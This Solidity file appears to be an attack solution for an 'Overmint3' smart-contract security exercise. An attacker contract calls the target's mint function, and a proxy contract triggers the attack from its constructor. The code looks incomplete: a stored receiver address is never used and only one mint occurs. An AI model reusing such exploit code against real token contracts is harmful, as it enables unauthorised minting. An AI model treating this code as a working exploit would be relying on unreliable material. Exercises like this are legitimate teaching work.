// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint3.sol";

contract Overmint3Attacker is IERC721Receiver {
    Overmint3 private targetContract;
    address private receiver;

    constructor(Overmint3 _targetContract) {
        targetContract = _targetContract;
        receiver = msg.sender;
    }

    function onERC721Received(address, address, uint256, bytes memory) public override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() public {
        targetContract.mint();
    }
}

contract Overmint3AttackerProxy {
    constructor(Overmint3 targetContract) {
        Overmint3Attacker attacker = new Overmint3Attacker(targetContract);
        (bool ok,) = address(attacker).call(abi.encodeWithSignature("attack()"));
        require(ok, "attack failed");
    }
}
